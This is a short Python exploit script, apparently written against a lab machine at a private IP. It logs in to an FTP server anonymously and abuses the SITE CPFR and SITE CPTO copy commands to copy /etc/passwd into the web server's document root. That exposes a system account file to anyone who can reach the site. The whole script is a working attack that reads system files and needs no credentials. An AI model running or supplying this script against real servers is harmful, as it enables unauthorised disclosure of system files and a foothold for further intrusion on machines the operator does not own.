from ftplib import FTP

target_ip = "192.168.168.129"
ftp_port = 21

# This is the file we want to copy FROM and TO
source_file = "/etc/passwd"  # file we know exists
target_file = "/var/www/html/copy.txt"  # file we want to create

try:
    print(f"[+] Connecting to FTP on {target_ip}...")
    ftp = FTP()
    ftp.connect(target_ip, ftp_port)
    ftp.login()  # anonymous login

    print("[+] Connected. Attempting to copy file...")
    ftp.sendcmd(f"SITE CPFR {source_file}")
    ftp.sendcmd(f"SITE CPTO {target_file}")
    print(f"[+] Copied {source_file} to {target_file}")

    ftp.quit()
except Exception as e:
    print(f"[-] Exploit failed: {e}")
